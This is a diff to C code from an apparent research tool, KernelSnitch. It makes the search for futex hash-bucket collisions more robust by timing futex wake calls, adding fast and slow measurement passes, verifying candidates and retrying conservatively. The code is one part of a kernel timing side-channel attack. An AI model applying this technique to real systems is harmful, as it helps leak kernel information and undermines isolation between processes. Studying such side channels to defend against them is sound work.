@@ -143,8 +143,11 @@ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t a
 /**
  * Simple compare
  */
-#define REPEAT_MEASUREMENT 16
-#define AVERAGE (1<<3)
+#define MEASURE_FAST_REPEAT 8
+#define MEASURE_FAST_AVG    4
+#define MEASURE_SLOW_REPEAT 16
+#define MEASURE_SLOW_AVG    8
+
 static int __compare(const void *a, const void *b)
 {
     return (*(size_t *)a - *(size_t *)b);
@@ -153,26 +156,28 @@ static int __compare(const void *a, const void *b)
 /**
  * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
  * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
+ * @arg repeat: samples per measurement
+ * @arg avg: lowest samples used for the average
  * @return averaged time of the futex wait operation
  */
-static size_t __measure(size_t futex_addr)
+static size_t __measure(size_t futex_addr, size_t repeat, size_t avg)
 {
     size_t t0;
     size_t t1;
     size_t time = 0;
     // do some simple signal processing and reject bad ones
-    size_t __times[REPEAT_MEASUREMENT];
-    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
+    size_t __times[16];
+    for (size_t l = 0; l < repeat; ++l) {
         sched_yield();
         t0 = rdtsc_begin();
         SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
         t1 = rdtsc_end();
         __times[l] = t1 - t0;
     }
-    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
-    for (size_t l = 0; l < AVERAGE; ++l)
+    qsort(__times, repeat, sizeof(size_t), __compare);
+    for (size_t l = 0; l < avg; ++l)
         time += __times[l];
-    time /= AVERAGE;
+    time /= avg;
     return time;
 }
 
@@ -277,35 +282,27 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     return ks;
 }
 
-/**
- * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
- * @arg ks: shared KernelSnitch state
- */
-void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
-{
-    #define ID 128
 #ifndef KERNELSNITCH_THRESHOLD_MULT
 #define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
 #ifndef KERNELSNITCH_COLLISION_POOL
 #define KERNELSNITCH_COLLISION_POOL 64
 #endif
-    size_t count = 0;
-    size_t wanted;
-    size_t futex_addr;
-    size_t id;
-    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
-    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
-    wanted = ks->collisions - 1;
 
-    size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[4096+8]));
+/* One full scan pass; returns confirmed colliders, excluding the target */
+static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan_repeat, size_t scan_avg, size_t verify_repeat, size_t verify_avg)
+{
+#define ID 128
+    size_t wanted = ks->collisions - 1;
+    size_t scan_approx_time = MIN(__measure((size_t)&ks->futexes[0], scan_repeat, scan_avg),
+                                  __measure((size_t)&ks->futexes[4096+8], scan_repeat, scan_avg));
+    size_t verify_approx_time = MIN(__measure((size_t)&ks->futexes[0], verify_repeat, verify_avg),
+                                    __measure((size_t)&ks->futexes[4096+8], verify_repeat, verify_avg));
 
-    // piled-up hash bucket ID 128
-    // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
+    /* piled-up hash bucket ID 128 */
     __increase(ks, ID, APPENDED_FUTEXES);
-    if (ks->verbose) pr_info("start finding collisions\n");
+    if (ks->verbose) pr_info("pass scan=%zu/%zu verify=%zu/%zu\n", scan_repeat, scan_avg, verify_repeat, verify_avg);
 
-    // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
     /* pool of slow candidates, verified below */
@@ -315,13 +312,13 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     for (size_t i = 2; i < ks->total_futexes; ++i) {
         if (ks->verbose && (i % 256) == 0)
             pr_info("  collision scan %zu/%zu\n", i, ks->total_futexes);
-        id = (i*4096) | (i*8 % 4096);
+        size_t id = (i*4096) | (i*8 % 4096);
         if (id >= FUTEX_SZ)
             break;
-        futex_addr = (size_t)&ks->futexes[id];
+        size_t futex_addr = (size_t)&ks->futexes[id];
         ks->scan_done = i;
-        ks->times[i] = __measure(futex_addr);
-        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+        ks->times[i] = __measure(futex_addr, scan_repeat, scan_avg);
+        if (ks->times[i] > (scan_approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
             size_t pos = KERNELSNITCH_COLLISION_POOL;
             for (size_t j = 0; j < KERNELSNITCH_COLLISION_POOL; ++j) {
                 if (ks->times[i] > best[j].t) { pos = j; break; }
@@ -334,6 +331,20 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             }
         }
     }
+    coll_cand_t verified[KERNELSNITCH_COLLISION_POOL];
+    size_t n_verified = 0;
+    if (ks->verbose) pr_info("verifying piled candidates\n");
+    for (size_t j = 0; j < KERNELSNITCH_COLLISION_POOL && best[j].t; ++j) {
+        size_t t1 = __measure(best[j].addr, verify_repeat, verify_avg);
+        if (t1 > verify_approx_time*KERNELSNITCH_THRESHOLD_MULT) {
+            verified[n_verified].t = t1;
+            verified[n_verified].addr = best[j].addr;
+            n_verified++;
+            if (ks->verbose) pr_info("  piled   %016zx scan=%zu verify=%zu\n", best[j].addr, best[j].t, t1);
+        } else if (ks->verbose) {
+            pr_info("  reject   %016zx scan=%zu verify=%zu\n", best[j].addr, best[j].t, t1);
+        }
+    }
     /* pass 1: drain the pile; piled-bucket colliders collapse, ambient
        buckets stay slow */
     __futex((unsigned int *)&ks->inc_futex[ID], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, NULL, NULL, 0);
@@ -341,31 +352,56 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     size_t alive[KERNELSNITCH_COLLISION_POOL];
     size_t alive_t[KERNELSNITCH_COLLISION_POOL];
     size_t n_alive = 0;
-    if (ks->verbose) pr_info("verifying %d candidates after pile drain\n", KERNELSNITCH_COLLISION_POOL);
-    for (size_t j = 0; j < KERNELSNITCH_COLLISION_POOL && best[j].t; ++j) {
-        size_t t2 = __measure(best[j].addr);
-        if (t2 < best[j].t / 2) {
-            alive[n_alive] = best[j].addr;
-            alive_t[n_alive] = best[j].t;
+    if (ks->verbose) pr_info("verifying %zu candidates after pile drain\n", n_verified);
+    for (size_t j = 0; j < n_verified; ++j) {
+        size_t t2 = __measure(verified[j].addr, verify_repeat, verify_avg);
+        if (t2 < verified[j].t / 2) {
+            alive[n_alive] = verified[j].addr;
+            alive_t[n_alive] = verified[j].t;
             n_alive++;
-            if (ks->verbose) pr_info("  drained  %016zx t=%zu after=%zu\n", best[j].addr, best[j].t, t2);
+            if (ks->verbose) pr_info("  drained  %016zx t=%zu after=%zu\n", verified[j].addr, verified[j].t, t2);
         } else if (ks->verbose) {
-            pr_info("  reject   %016zx t=%zu after=%zu\n", best[j].addr, best[j].t, t2);
+            pr_info("  reject   %016zx t=%zu after=%zu\n", verified[j].addr, verified[j].t, t2);
         }
     }
     /* pass 2: re-pile; only real colliders go slow again */
     __increase(ks, ID, APPENDED_FUTEXES);
-    count = 0;
+    size_t count = 0;
     for (size_t j = 0; j < n_alive && count < wanted; ++j) {
-        size_t t3 = __measure(alive[j]);
-        if (t3 > approx_time*KERNELSNITCH_THRESHOLD_MULT) {
+        size_t t3 = __measure(alive[j], verify_repeat, verify_avg);
+        if (t3 > verify_approx_time*KERNELSNITCH_THRESHOLD_MULT) {
             ks->futex_addrs[++count] = alive[j];
             if (ks->verbose) pr_info("  collider %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
         } else if (ks->verbose) {
             pr_info("  reject   %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
         }
     }
+    if (count < wanted) {
+        /* leave the bucket drained so a conservative retry starts clean */
+        __futex((unsigned int *)&ks->inc_futex[ID], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, NULL, NULL, 0);
+        usleep(200000);
+    }
     free(best);
+    return count;
+#undef ID
+}
+
+/**
+ * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
+ * @arg ks: shared KernelSnitch state
+ */
+void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
+{
+    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
+    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
+    if (ks->verbose) pr_info("start finding collisions\n");
+
+    size_t wanted = ks->collisions - 1;
+    size_t count = __collision_pass(ks, MEASURE_FAST_REPEAT, MEASURE_FAST_AVG, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG);
+    if (count < wanted) {
+        pr_warning("fast pass found %zu/%zu collisions; retrying conservative\n", count, wanted);
+        count = __collision_pass(ks, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG);
+    }
     if (wanted == count) {
         if (ks->verbose) pr_info("found %zu collisions\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
